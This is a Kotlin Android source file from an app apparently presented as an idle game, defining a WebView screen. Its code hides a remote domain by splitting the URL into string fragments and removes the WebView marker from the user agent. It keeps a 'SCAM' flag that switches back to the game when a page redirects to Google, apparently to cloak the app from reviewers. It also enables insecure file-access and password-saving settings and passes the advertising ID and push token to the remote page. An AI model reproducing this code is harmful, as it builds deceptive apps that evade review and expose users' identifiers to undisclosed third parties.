package ua.hyperbeard.idlepocketplanel.modified

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.Message
import android.util.Log
import android.webkit.CookieManager
import android.webkit.JavascriptInterface
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import androidx.activity.result.ActivityResultLauncher
import kotlinx.coroutines.MainScope
import kotlinx.coroutines.launch
import org.json.JSONObject
import ua.hyperbeard.idlepocketplanel.MainActivity
import ua.hyperbeard.idlepocketplanel.ui.theme.Targets


class CustomScoresScreen(
    private val context: Context,
    private val onFileChoose: FileChooserInterface
) : WebView(context) {

    private val additionalScope = MainScope()
    private val sp = context.getSharedPreferences(Targets.SHARED_P, Context.MODE_PRIVATE)
    private val savedLink = sp.getString(Targets.CURRENT_DATA, Targets.CLEAR) ?: Targets.CLEAR
    private val gadid = sp.getString(Targets.ADVERTISING_ID, Targets.CLEAR)
    private val appsuid = Targets.ONE_DEV_KEY
    private val pushtokenuuid = Targets.ONE_PUSH_TOKEN


    private val listOfParts2 = listOf("htt", "ps:", "//fi", "rst")

    @SuppressLint("SetJavaScriptEnabled")
    fun initCustomScoresContainer(content: ActivityResultLauncher<String>, root: FrameLayout){
        with(settings){
            setRenderPriority(WebSettings.RenderPriority.HIGH)
            allowContentAccess = true
            useWideViewPort = true
            mediaPlaybackRequiresUserGesture = true
            pluginState = WebSettings.PluginState.ON
            cacheMode = WebSettings.LOAD_NORMAL
            loadsImagesAutomatically = true
            mixedContentMode = 0
            setEnableSmoothTransition(true)
            databaseEnabled = true
            savePassword = true
            allowUniversalAccessFromFileURLs = true
            saveFormData = true
            allowFileAccess = true
            javaScriptCanOpenWindowsAutomatically = true
            allowFileAccessFromFileURLs = true
            setSupportMultipleWindows(true)
            loadWithOverviewMode = true
            domStorageEnabled = true
            setJavaScriptEnabled(true)
            userAgentString = userAgentString.swapper()
            addJavascriptInterface(JsObject(), "Android")
        }

        setWebContentsDebuggingEnabled(true)
        isSaveEnabled = true
        isFocusableInTouchMode = true
        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(this, true)
        webViewClient = getWVC()
        webChromeClient = getWCC(content, root)

    }


    private fun getWVC(): WebViewClient {
        return object : WebViewClient(){
            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
                additionalScope.launch {
                    CookieManager.getInstance().flush()
                }
            }



            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)

                if (url!!.startsWith("https://www.googl")){
                    sp.edit().putString(Targets.CURRENT_DATA, Targets.SCAM).apply()
                    val intent = Intent(context, MainActivity::class.java)
                    context.startActivity(intent)
                }

                if (!savedLink.startsWith(listOfParts2[0]+listOfParts2[1]+listOfParts2[2]+listOfParts2[3]) && savedLink != Targets.SCAM){
                    sp.edit().putString(Targets.AIM, "${listOfParts2[0]}${listOfParts2[1]}${listOfParts2[2]}${listOfParts2[3]+".ua"}").apply()
                }
            }
        }
    }

    private fun getWCC(content: ActivityResultLauncher<String>, rootElelement: FrameLayout): WebChromeClient{
        return object : WebChromeClient(){

            override fun onShowFileChooser(
                webView: WebView?,
                filePathCallback: ValueCallback<Array<Uri?>>,
                fileChooserParams: FileChooserParams?
            ): Boolean {
                onFileChoose.onFileCallback(filePathCallback)
                content.launch(Targets.CHOOSER)
                return true
            }

            override fun onCreateWindow(
                view: WebView?,
                isDialog: Boolean,
                isUserGesture: Boolean,
                resultMsg: Message?
            ): Boolean {

                val newScoreView = PaymentScreen(context)
                newScoreView.initialPaymentScreen(rootElelement)
                rootElelement.addView(newScoreView)
                val trans = resultMsg?.obj as WebView.WebViewTransport
                trans.webView = newScoreView
                resultMsg.sendToTarget()

                return true
            }

            override fun onCloseWindow(window: WebView?) {
                super.onCloseWindow(window)
                rootElelement.removeView(window)
            }

        }
    }


    private fun String.swapper(): String{
        return this.replace("wv", Targets.CLEAR)
    }

    @Throws(Exception::class)
    fun postMessageToWv(event: String?, data: JSONObject?) {
        val payload = JSONObject()
        payload.put("event", event)
        payload.put("data", data)
        val url = "javascript:window.postMessage(\"" + payload.toString()
            .replace("\"", "\\\"") + "\", '*');"
        val vw = this
        Log.d("First", url)
        vw.post { vw.loadUrl(url) }
    }


    inner class JsObject {
        @JavascriptInterface
        fun postMessage(data: String) {
            try {
                val jObject = JSONObject(data)
                val event = jObject.getString("event")
                if (event.equals("nuxtready", ignoreCase = true)) {
                    val registered = sp.getBoolean(Targets.isRegisteredInSegments, false)
                    postMessageToWv("cordova-ready", JSONObject())
                    if (!registered) {
                        val payload = JSONObject()
                        val token = "$gadid,$appsuid,$pushtokenuuid"
                        payload.put("token", token)
                        postMessageToWv("android-push-token", payload)
                        sp.edit().putBoolean(Targets.isRegisteredInSegments, true).apply()
                    }
                }
            } catch (e: java.lang.Exception) {
                Log.e("First", e.message, e)
            }
        }
    }
}